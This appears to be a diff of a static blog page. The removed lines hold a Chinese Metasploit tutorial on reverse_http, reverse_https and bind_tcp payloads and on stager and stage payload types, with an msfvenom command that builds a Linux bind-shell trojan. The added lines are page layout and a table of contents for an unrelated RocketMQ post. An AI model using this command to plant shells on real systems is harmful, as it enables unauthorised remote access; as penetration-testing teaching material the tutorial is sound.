-<p>基于http方式的反向连接，在网速慢的情况下不稳定。</p>
-<p>payload:&#x2F;windows&#x2F;meterpreter&#x2F;reverse_http</p>
-<p>3.reverse_https</p>
-<p>基于https方式的反向连接，在网速慢的情况下不稳定， https如果反弹没有收到数据，可以将监听端口换成443试试</p>
-<p>payload:&#x2F;windows&#x2F;meterpreter&#x2F;reverse_https</p>
-<p>4.bind_tcp</p>
-<p>这是一个基于TCP的正向连接shell，因为在内网跨网段时无法连接到attack的机器，所以在内网中经常会使用，不需要设置LHOST。</p>
-<p>使用下列命令生成木马：</p>
-<p>msfvenom -p linux&#x2F;x86&#x2F;meterpreter&#x2F;bind_tcp lport&#x3D;4444 -f elf -o shell</p>
-<p>同样道理加权限运行，不演示了。</p>
-
-
-<p>这里注意，我们设置的IP地址和端口就是目标机的。因为这是我们主动来连接它。</p>
-<h2 id="相关Payload"><a href="#相关Payload" class="headerlink" title="相关Payload"></a>相关Payload</h2><p>Payload中包含有需要在远程系统中运行的恶意代码，而在Metasploit中Payload是一种特殊模块，它们能够以漏洞利用模块运行，并能够利用目标系统中的安全漏洞实施攻击。简而言之，这种漏洞利用模块可以访问目标系统，而其中的代码定义了Payload在目标系统中的行为。</p>
-<p>Metasploit中的Payload模块主要有以下三种类型：</p>
-<p>-Single</p>
-<p>-Stager</p>
-<p>-Stage</p>
-<p>Single是一种完全独立的Payload，而且使用起来就像运行calc.exe一样简单，例如添加一个系统用户或删除一份文件。由于Single Payload是完全独立的，因此它们有可能会被类似<a class="link" target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Netcat">netcat <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>这样的非metasploit处理工具所捕捉到。</p>
-<p>Stager这种Payload负责建立目标用户与攻击者之间的网络连接，并下载额外的组件或应用程序。一种常见的Stagers Payload就是reverse_tcp，它可以让目标系统与攻击者建立一条tcp连接。另一种常见的是bind_tcp，它可以让目标系统开启一个tcp监听器，而攻击者随时可以与目标系统进行通信。</p>
-<p>Stage是Stager Payload下载的一种Payload组件，这种Payload可以提供更加高级的功能，而且没有大小限制。</p>
-<p>在Metasploit中，我们可以通过Payload的名称和使用格式来推断它的类型：</p>
-<p>Single Payload的格式为<target>&#x2F; <single></single></target></p>
-<p>Stager&#x2F;Stage Payload的格式为<target>&#x2F; <stage> &#x2F; <stager></stager></stage></target></p>
-<p>当我们在Metasploit中执行“show payloads”命令之后，它会给我们显示一个可使用的Payload列表：</p>
-<p>  在这个列表中，windows&#x2F;powershell_bind_tcp就是一个Single Payload，它不包含Stage Payload。而windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp则由一个Stager Payload（reverse_tcp）和一个Stage Payload（meterpreter）组成。</p>
-
+            </div>
         
     </div>
-    <div class="page-template-comments">
-        
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">此页目录</div>
+        <div class="page-title"></div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8Docker%E5%9C%A8Ubuntu%E4%B8%8A%E6%9E%84%E5%BB%BARocketMQ%E9%9B%86%E7%BE%A4%E7%9A%84%E9%83%A8%E7%BD%B2%E8%AE%BA%E6%96%87"><span class="nav-text">使用Docker在Ubuntu上构建RocketMQ集群的部署论文</span></a></li></ol>
+
     </div>
 </div>
+        </div>
+    
+</div>
+
 
 
                 
@@ -745,6 +903,27 @@
         </div>
     </div>
 
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
     
 
     <div class="right-side-tools-container">
